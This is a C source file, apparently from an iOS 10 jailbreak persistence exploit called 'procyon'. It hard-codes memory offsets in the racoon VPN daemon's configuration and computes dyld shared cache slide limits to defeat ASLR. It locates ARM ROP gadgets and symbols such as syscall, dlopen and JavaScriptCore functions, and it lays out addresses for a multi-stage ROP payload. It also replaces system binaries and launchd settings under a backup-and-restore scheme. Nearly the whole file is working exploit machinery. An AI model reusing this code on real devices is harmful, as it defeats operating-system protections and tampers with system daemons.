#include "util.h"
#include "gadget_finder.h"
#include "patchfinder.h"
#include "procyon.h"

procyon_ctx_t *procyon = NULL;

static int procyon_init_offsets(void) {
    procyon->offsets.data_view.array_buffer = 0x10;
    procyon->offsets.data_view.byte_length = 0x14;
    procyon->offsets.data_view.mode = 0x18;

    procyon->offsets.racoon.isakmp_cfg_addr = 0xB9C08;
    procyon->offsets.racoon.lcconf_addr = 0xB908C;
    procyon->offsets.racoon.dns4_arr = 0x8;
    procyon->offsets.racoon.lcconf_counter = 0xA0;
    procyon->offsets.racoon.dns4_to_lcconf = (-((procyon->offsets.racoon.isakmp_cfg_addr + procyon->offsets.racoon.dns4_arr) - procyon->offsets.racoon.lcconf_addr));

    get_ios_version(&procyon->ios_version[0]);
    if (procyon->ios_version[0] != 10) {
        print_log(true, "[-] unsupported iOS version\n");
        return -1;
    }

    if (procyon->ios_version[1] == 3) {
        char model[128] = {0};
        size_t size = sizeof(model)-1;
        sysctlbyname("hw.machine", model, &size, NULL, 0);

        if (strstr(model, "iPhone") != NULL) {
            procyon->use_dhcpd = false;
        } else {
            procyon->use_dhcpd = (procyon->ios_version[2] < 2); // < 10.3.2
        }
    } else {
        procyon->use_dhcpd = true;
    }

    procyon->use_dhcpd = (procyon->ios_version[1] <= 2);
    if (run_patchfinder() != 0) return -1;
    return 0;
}

static int procyon_init_dsc(void) {
    procyon->dsc.region_base = 0x1a000000;
    procyon->dsc.region_size = 0x26000000;
    procyon->dsc.info = dyld_cache_init();
    if (procyon->dsc.info == NULL) {
        print_log(true, "[-] failed to load dyld_shared_cache\n");
        return -1;
    }

    uint32_t cpu_family = 0;
    size_t size = sizeof(cpu_family);
    sysctlbyname("hw.cpufamily", &cpu_family, &size, NULL, 0);

    char model[128] = {0};
    size = sizeof(model)-1;
    sysctlbyname("hw.machine", model, &size, NULL, 0);

    procyon->dsc.remap_base = 0x40000000;
    procyon->dsc.remap_size = procyon->dsc.info->mappings[0].size;

    uint32_t rw_mapping_start = procyon->dsc.info->mappings[1].virt_addr;
    uint32_t rw_mapping_end = rw_mapping_start + procyon->dsc.info->mappings[1].size;
    uint32_t ro_mapping_start = procyon->dsc.info->mappings[2].virt_addr;
    uint32_t ro_mapping_end = ro_mapping_start + procyon->dsc.info->mappings[2].size;

    uint32_t real_max_slide = procyon->dsc.region_size - (ro_mapping_end - procyon->dsc.region_base);
    uint32_t safe_max_slide = (rw_mapping_end - rw_mapping_start);
    procyon->dsc.max_slide = (safe_max_slide > real_max_slide) ? real_max_slide : safe_max_slide;
    procyon->unsafe_slide = (real_max_slide > safe_max_slide && procyon->ios_version[1] == 3);
    return 0;
}

static int procyon_init_stages(void) {
    if (procyon->use_dhcpd) {
        procyon->stage1.stack_base = 0x2c0000 + 0x10;
    } else {
        procyon->stage1.stack_base = (procyon->symbols.platform_memmove_lazy_ptr + procyon->dsc.max_slide + 0x10) - 0x4000;
        if (procyon->unsafe_slide) procyon->stage1.stack_base -= 0x40000;
    }
    
    procyon->stage1.stack_base += (procyon->stage1.stack_base % 0x8);
    addr_converter_t converter = {.addr = procyon->stage1.stack_base};
	for (uint32_t i = 0; i < sizeof(converter.buf); i++) {
		if (converter.buf[i] == '"') {
			converter.addr += 0x8;
			i = 0;
		}
	}

    procyon->stage1.stack_base = converter.addr;
    procyon->stage2.stack_base = 0x12000000;
    procyon->stage2.stack_varibles = procyon->stage2.stack_base + 0x100;
    procyon->stage2.stack_strings = procyon->stage2.stack_varibles + 0x1000;
    procyon->stage2.stack_size = 0x80000;
    procyon->stage3.mapping_base = 0x13000000;
    procyon->stage3.mapping_size = 0x20000;
 
    dsc_image_t *image = NULL;
    for (uint32_t i = 0; i < procyon->dsc.info->image_count; i++) {
        if (strstr(procyon->dsc.info->images[i].path, "JavaScriptCore") != NULL) {
            image = &procyon->dsc.info->images[i];
            break;
        }
    }
    
    if (image == NULL) return -1;
    procyon->stage2.repair_local = (image->data_local_addr & ~0xfff);
    procyon->stage2.repair_start = (image->data_virt_addr & ~0xfff);
    procyon->stage2.repair_end = ((image->data_virt_addr + image->data_size) & ~0xfff);
    procyon->stage2.repair_offset = (procyon->symbols.platform_memmove_lazy_ptr & 0xfff);
    return 0;
}

static int procyon_init_gadgets(void) {
    if ((procyon->gadgets.pop_r4_r7_pc = find_pop_r4_r7_pc()) == 0) return -1;
    if ((procyon->gadgets.pop_r0_r1_r2_r3_r4_pc = find_pop_r0_r1_r2_r3_r4_pc()) == 0) return -1;
    if ((procyon->gadgets.pop_r4_r5_r6_r7_pc = find_pop_r4_r5_r6_r7_pc()) == 0) return -1;
    if ((procyon->gadgets.ldr_r1_r2_4_bx_lr = find_ldr_r1_r2_4_bx_lr()) == 0) return -1;
    if ((procyon->gadgets.svc_0x80_bx_lr = find_svc_0x80_bx_lr()) == 0) return -1;
    if ((procyon->gadgets.str_r0_r3_bx_lr = find_str_r0_r3_bx_lr()) == 0) return -1;
    if ((procyon->gadgets.pop_r2_r3_r7_pc = find_pop_r2_r3_r7_pc()) == 0) return -1;
    if ((procyon->gadgets.ldr_r0_r2_bx_lr = find_ldr_r0_r2_bx_lr()) == 0) return -1;
    if ((procyon->gadgets.add_r0_r2_bx_lr = find_add_r0_r2_bx_lr()) == 0) return -1;
    if ((procyon->gadgets.str_r0_r2_bx_lr = find_str_r0_r2_bx_lr()) == 0) return -1;
    if ((procyon->gadgets.str_r2_r3_bx_lr = find_str_r2_r3_bx_lr()) == 0) return -1;
    if ((procyon->gadgets.add_r0_r1_bx_lr = find_add_r0_r1_bx_lr()) == 0) return -1;
    if ((procyon->gadgets.pop_r0_r1_pc = find_pop_r0_r1_pc()) == 0) return -1;
    if ((procyon->gadgets.str_r0_r1_bx_lr = find_str_r0_r1_bx_lr()) == 0) return -1;
    if ((procyon->gadgets.pop_r12_pc = find_pop_r12_pc()) == 0) return -1;
    if ((procyon->gadgets.pop_lr_pc = find_pop_lr_pc()) == 0) return -1;
    if ((procyon->gadgets.ldm_r1_r3_r5_r10_r11_r12_lr_pc = find_ldm_r1_r3_r5_r10_r11_r12_lr_pc()) == 0) return -1;
    if ((procyon->gadgets.ldm_r5_r0_r2_r4_r5_r8_r11_r12_pc = find_ldm_r5_r0_r2_r4_r5_r8_r11_r12_pc()) == 0) return -1;
    if ((procyon->gadgets.ldm_r3_r1_r3_r9_r10_pc = find_ldm_r3_r1_r3_r9_r10_pc()) == 0) return -1;
    if ((procyon->gadgets.js_proto_lr = find_js_proto_lr()) == 0) return -1;
    if ((procyon->gadgets.rop_start = find_rop_start()) == 0) return -1;
    return 0;
}

static int procyon_init_symbols(void) {
    if ((procyon->symbols.longjump = find_longjmp()) == 0) return -1;
    if ((procyon->symbols.syscall = find_syscall()) == 0) return -1;
    if ((procyon->symbols.dlopen = dyld_cache_find_symbol(procyon->dsc.info, LIBDYLD_PATH, "_dlopen")) == 0) return -1;
    if ((procyon->symbols.dlsym = dyld_cache_find_symbol(procyon->dsc.info, LIBDYLD_PATH, "_dlsym")) == 0) return -1;
    if ((procyon->symbols.mach_msg_trap = find_mach_msg_trap()) == 0) return -1;
    if ((procyon->symbols.platform_memmove = find_platform_memmove()) == 0) return -1;
    if ((procyon->symbols.platform_memmove_lazy_ptr = find_platform_memmove_lazy_ptr()) == 0) return -1;
    if ((procyon->symbols.JSGlobalContextCreate = dyld_cache_find_symbol(procyon->dsc.info, JSC_PATH, "_JSGlobalContextCreate")) == 0) return -1;
    if ((procyon->symbols.JSContextGetGlobalObject = dyld_cache_find_symbol(procyon->dsc.info, JSC_PATH, "_JSContextGetGlobalObject")) == 0) return -1;
    if ((procyon->symbols.JSStringCreateWithUTF8CString = dyld_cache_find_symbol(procyon->dsc.info, JSC_PATH, "_JSStringCreateWithUTF8CString")) == 0) return -1;
    if ((procyon->symbols.JSObjectSetProperty = dyld_cache_find_symbol(procyon->dsc.info, JSC_PATH, "_JSObjectSetProperty")) == 0) return -1;
    if ((procyon->symbols.JSObjectGetProperty = dyld_cache_find_symbol(procyon->dsc.info, JSC_PATH, "_JSObjectGetProperty")) == 0) return -1;
    if ((procyon->symbols.JSValueToObject = dyld_cache_find_symbol(procyon->dsc.info, JSC_PATH, "_JSValueToObject")) == 0) return -1;
    if ((procyon->symbols.JSValueMakeNumber = dyld_cache_find_symbol(procyon->dsc.info, JSC_PATH, "_JSValueMakeNumber")) == 0) return -1;
    if ((procyon->symbols.JSObjectCallAsConstructor = dyld_cache_find_symbol(procyon->dsc.info, JSC_PATH, "_JSObjectCallAsConstructor")) == 0) return -1;
    if ((procyon->symbols.JSObjectMakeArray = dyld_cache_find_symbol(procyon->dsc.info, JSC_PATH, "_JSObjectMakeArray")) == 0) return -1;
    if ((procyon->symbols.JSEvaluateScript = dyld_cache_find_symbol(procyon->dsc.info, JSC_PATH, "_JSEvaluateScript")) == 0) return -1;
    return 0;
}

void procyon_deinit(void) {
    if (procyon == NULL) return;
    if (procyon->dsc.info != NULL) {
        dyld_cache_deinit(procyon->dsc.info);
    }

    bzero(procyon, sizeof(procyon_ctx_t));
    free(procyon);
    procyon = NULL;
}

int procyon_init(void) {
    procyon = calloc(1, sizeof(procyon_ctx_t));
    if (procyon == NULL) return -1;

    if (procyon_init_offsets() != 0) goto err;
    if (procyon_init_dsc() != 0) goto err;
    
    print_log(false, "[*] finding rop gadgets...\n");
    if (procyon_init_gadgets() != 0) {
        print_log(true, "[-] failed to find rop gadgets\n");
        goto err;
    }

    print_log(false, "[*] finding symbols...\n");
    if (procyon_init_symbols() != 0) {
        print_log(true, "[-] failed to find symbols\n");
        goto err;
    }

    if (procyon_init_stages() != 0) goto err;
    return 0;

err:
    procyon_deinit();
    return -1;
}

int procyon_create_backup(void) {
    if (access("/var/root/procyon/backup", F_OK) == 0) return 0;
    mkdir("/var/root/procyon/backup", 0777);
    chown("/var/root/procyon/backup", 0, 0);
    if (access("/var/root/procyon/backup", F_OK) != 0) return -1;

    copy_file("/etc/racoon/racoon.conf", "/var/root/procyon/backup/racoon.conf");
    if (procyon->use_dhcpd) {
        copy_file("/etc/dhcpd.conf", "/var/root/procyon/backup/dhcpd.conf");
    }

    copy_file("/usr/libexec/backboardd", "/var/root/procyon/backup/backboardd");
    copy_file("/usr/libexec/wifiFirmwareLoaderLegacy", "/var/root/procyon/backup/wifiFirmwareLoaderLegacy");
    copy_file("/var/db/com.apple.xpc.launchd/disabled.plist", "/var/root/procyon/backup/disabled.plist");
    sync_volume("/private/var");
    return 0;
}

int procyon_restore_backup(void) {
    if (access("/var/root/procyon/backup/racoon.conf", F_OK) == 0) {
        remove_at_path("/etc/racoon/racoon.conf");
        copy_file("/var/root/procyon/backup/racoon.conf", "/etc/racoon/racoon.conf");
    }

    if (access("/var/root/procyon/backup/dhcpd.conf", F_OK) == 0) {
        remove_at_path("/etc/dhcpd.conf");
        copy_file("/var/root/procyon/backup/dhcpd.conf", "/etc/dhcpd.conf");
    }

    if (access("/var/root/procyon/backup/backboardd", F_OK) == 0) {
        remove_at_path("/usr/libexec/backboardd");
        copy_file("/var/root/procyon/backup/backboardd", "/usr/libexec/backboardd");
    }
 
    if (access("/var/root/procyon/backup/wifiFirmwareLoaderLegacy", F_OK) == 0) {
        remove_at_path("/usr/libexec/wifiFirmwareLoaderLegacy");
        copy_file("/var/root/procyon/backup/wifiFirmwareLoaderLegacy", "/usr/libexec/wifiFirmwareLoaderLegacy");
    } else if (access("/usr/libexec/wifiFirmwareLoaderLegacy_orig", F_OK) == 0) {
        remove_at_path("/usr/libexec/wifiFirmwareLoaderLegacy");
        move_file("/usr/libexec/wifiFirmwareLoaderLegacy_orig", "/usr/libexec/wifiFirmwareLoaderLegacy", true);
    }

    if (access("/var/root/procyon/backup/disabled.plist", F_OK) == 0) {
        remove_at_path("/var/db/com.apple.xpc.launchd/disabled.plist");
        copy_file("/var/root/procyon/backup/disabled.plist", "/var/db/com.apple.xpc.launchd/disabled.plist");
    } else {
        remove_at_path("/var/db/com.apple.xpc.launchd/disabled.plist");
        remove_at_path("/var/db/com.apple.xpc.launchd/disabled_orig.plist");
    }

    sync_volume("/");
    return 0;
}
